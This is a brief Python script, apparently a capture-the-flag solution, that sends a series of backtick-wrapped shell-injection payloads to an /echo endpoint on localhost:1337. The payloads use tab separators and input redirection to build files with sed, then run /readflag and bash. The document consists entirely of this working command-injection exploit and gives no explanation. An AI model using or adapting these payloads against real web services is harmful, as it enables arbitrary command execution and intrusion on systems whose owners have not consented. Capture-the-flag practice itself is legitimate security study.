import requests

commands = [
'`touch1<sed\t-i\tsz.......zz\tlol`',
'`ls1<fix`',
'`/readflag1<lol`',
'`bash<fix`',
'`bash<lol`',
]

for cmd in commands:
    # print(requests.post('http://localhost:1337/echo', data={"msg":cmd}).text)
    print(requests.post('http://localhost:1337/echo', data={"msg":cmd}).text)
